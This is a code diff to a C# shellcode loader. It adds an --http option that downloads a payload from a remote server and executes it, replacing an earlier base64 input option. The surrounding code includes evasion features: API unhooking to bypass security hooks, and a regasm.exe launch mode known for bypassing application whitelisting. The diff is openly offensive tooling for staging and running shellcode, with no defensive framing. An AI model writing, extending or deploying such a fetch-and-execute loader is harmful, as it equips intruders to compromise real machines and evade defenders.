@@ -7,6 +7,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using DI = XYZ.DI;
 using System.EnterpriseServices;
+using System.Net;
 
 namespace ShellcodeLoader
 {
@@ -34,8 +35,8 @@ namespace ShellcodeLoader
                     case "--file":
                         args.Add(arg.Split('=')[1]);
                         break;
-                    case "--base64":
-                        args.Add("--base64");
+                    case "--http":
+                        args.Add("--http");
                         args.Add(arg.Split('=')[1]);
                         break;
                     default:
@@ -221,20 +222,30 @@ namespace ShellcodeLoader
             return keybuilder.ToString();
         }
 
+        private static byte[] downloadPayload(string server, int port, string file)
+        {
+            string MARKER_PARAM = "shcgen";
+            using (var client = new WebClient())
+            {
+                server = server.TrimEnd('/').Trim();
+                file = file.Trim();
+                return client.DownloadData("http://" + server + ':' + port.ToString() + "/" + file + "?" + MARKER_PARAM);
+            }
+        }
+
         private static void usage()
         {
             StringBuilder sb = new StringBuilder();
-            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [shellcode_file|--base64 base64_shellcode] [-- shellcode_param1 [shellcode_param2...]]");
+            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [--http server[:port]] [shellcode_file] [-- shellcode_param1 [shellcode_param2...]]");
             sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
-            sb.AppendLine("\\base64_shellcode\tshellcode in base64 format");
-            sb.AppendLine("\\--\tEverything after \"--\" is passed to the shellcode as CLI arguments.");
+            sb.AppendLine("\t--http server[:port]\tdownload the payload file from the server instead of searching it locally. Default port: 8080");
+            sb.AppendLine("\t--\tEverything after \"--\" is passed to the shellcode as CLI arguments.");
             sb.AppendLine("If <shellcode_file> is not specified, the program will search for \"shellcode.bin\" the current working directory and then in C:\\Users\\Public.");
             sb.AppendLine("\t-p password\t[TEMPORARILY DISABLED] if a password is required for the key, it will be read from this parameter instead of asking interactively");
             sb.AppendLine("\t--no-unhook\tDON'T UNHOOK API before loading the shellcode");
-            sb.AppendLine("\t--base64\tThe positional argument is directly the shellcode in base64 format.");
             sb.AppendLine("\nREGASM Mode:");
-            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [+--no-unhook] [+--file=shellcode_file|+--base64=base64_shellcode]  [+-- shellcode_param1 [shellcode_param2...]]");
-            sb.AppendLine("NOTE: Due to regasm complaining about wrong parameters, EVERY argument starting with a '-' MUST be prefixed with a '+', this also applies to shellcode params.(the '+' will be automatically removed during paring).");
+            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [+--no-unhook] [+--http=connection_string] [+--file=shellcode_file]  [+-- shellcode_param1 [shellcode_param2...]]");
+            sb.AppendLine("\nNOTE: Due to regasm complaining about wrong parameters, EVERY argument starting with a '-' MUST be prefixed with a '+', this also applies to shellcode params.(the '+' will be automatically removed during paring).");
             Console.WriteLine(sb.ToString());
         }
 
@@ -262,9 +273,11 @@ namespace ShellcodeLoader
         public static int Main(string[] args)
         {
             // PARAMS
-            string filename_or_base64 = null;
+            string filename = null;
             string password = null;
-            bool isbase64 = false;
+            bool use_server = false;
+            string server_ip = null;
+            int server_port = 8080;
 
             for (int i = 0; i < args.Length; i++)
             {
@@ -278,8 +291,30 @@ namespace ShellcodeLoader
                     case "--no-unhook":
                         Program.unhook = false;
                         break;
-                    case "--base64":
-                        isbase64 = true;
+                    case "--http":
+                        use_server = true;
+                        if (i + 1 >= args.Length)
+                        {
+                            usage();
+                            return -1;
+                        }
+                        string connection_str = args[i + 1];
+                        try
+                        {
+                            server_ip = connection_str;
+                            if (connection_str.Contains(':'))
+                            {
+                                server_ip = connection_str.Split(':')[0];
+                                server_port = int.Parse(connection_str.Split(':')[1]);
+                            }
+                        } catch (Exception e)
+                        {
+                            Console.Error.WriteLine("Error parsing server connection string.");
+                            Console.Error.WriteLine(e.Message);
+                            return -1;
+                        }
+
+                        i++;
                         break;
                     case "-p":
                         if (i + 1 >= args.Length)
@@ -291,9 +326,9 @@ namespace ShellcodeLoader
                         i++;
                         break;
                     default:
-                        if (filename_or_base64 == null)
+                        if (filename == null)
                         {
-                            filename_or_base64 = args[i];
+                            filename = args[i];
                         }
                         else
                         {
@@ -304,18 +339,27 @@ namespace ShellcodeLoader
                 }
             }
 
-            if (isbase64)
+            byte[] rawcontent;
+            if (use_server)
             {
-                if (filename_or_base64 == null)
+                if (filename == null)
                 {
-                    Console.Error.WriteLine("You have used the --base64 flag without specifying the base64 shellcode");
-                    return -3;
+                    Console.Error.WriteLine("Please specify a file name.");
+                    return -1;
                 }
-                return GoB64(filename_or_base64);
+                try
+                {
+                    rawcontent = downloadPayload(server_ip, server_port, filename);
+                } catch (Exception e)
+                {
+                    Console.Error.WriteLine("Error fetching the payload from the server.");
+                    Console.Error.WriteLine(e.Message);
+                    return -4;
+                }
+                return Go(rawcontent);
             }
             else
             {
-                string filename = filename_or_base64;
                 if (filename == null)
                 {
                     if (File.Exists("shellcode.bin"))
@@ -340,7 +384,6 @@ namespace ShellcodeLoader
                 }
 
                 // Load shellcode from file
-                byte[] rawcontent;
                 try
                 {
                     rawcontent = File.ReadAllBytes(filename);
